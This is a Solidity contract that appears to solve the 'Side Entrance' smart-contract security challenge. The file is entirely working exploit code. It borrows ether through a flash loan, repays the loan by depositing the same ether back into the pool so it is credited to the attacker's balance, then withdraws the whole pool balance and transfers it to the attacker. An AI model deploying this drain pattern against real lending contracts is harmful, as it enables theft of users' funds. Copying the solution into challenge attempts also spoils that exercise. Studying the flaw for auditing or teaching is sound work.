pragma solidity 0.8.7;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttack is IFlashLoanEtherReceiver {

    SideEntranceLenderPool pool;
    address payable attacker;
    constructor(SideEntranceLenderPool _pool){
        pool = _pool;
        attacker = payable(msg.sender);
    }
    function execute() override external payable{
        //deposit ether (essentially paying back the flashloan in a way that we can withdraw all the ether back)
        pool.deposit{value: msg.value}();
    }

    function takeFlashLoan() external payable{
        pool.flashLoan(msg.value);
    }

    function withdraw() external{
        pool.withdraw();
        //transfer the contract's balance to the attacker!
        attacker.transfer(address(this).balance);
    }

    receive() payable external{

    }
}

